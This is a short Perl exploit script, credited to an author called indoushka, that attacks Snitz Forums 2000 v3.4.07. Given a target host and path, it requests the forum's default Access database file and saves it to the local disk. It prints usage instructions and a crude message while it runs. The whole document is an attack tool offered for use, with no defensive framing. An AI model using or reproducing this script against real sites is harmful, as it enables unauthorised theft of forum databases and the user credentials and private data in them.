#!/usr/bin/perl -w
#
# Snitz Forums 2000 v3.4.07 Database Disclosure Exploit 
#
# Author : indoushka
#
# Vondor : http://forum.snitz.com
 
 
 
use LWP::Simple;
use LWP::UserAgent;

system('cls');
system('Snitz Forums 2000 v3.4.07 Database Disclosure Exploit');
system('color a');


if(@ARGV < 2)
{
print "[-]How To Use\n\n";
&help; exit();
}
sub help()
{
print "[+] usage1 : perl $0 site.com /path/ \n";
print "[+] usage2 : perl $0 localhost / \n";
}
($TargetIP, $path, $File,) = @ARGV;

$File="dbase/snitz_forums_2000.mdb";
my $url = "http://" . $TargetIP . $path . $File;
print "\n Fuck you wait!!! \n\n";

my $useragent = LWP::UserAgent->new();
my $request = $useragent->get($url,":content_file" => "D:/snitz_forums_2000.mdb");

if ($request->is_success)
{
print "[+] $url Exploited!\n\n";
print "[+] Database saved to D:/snitz_forums_2000.mdb\n";
exit();
}
else
{
print "[!] Exploiting $url Failed !\n[!] ".$request->status_line."\n";
exit();
}
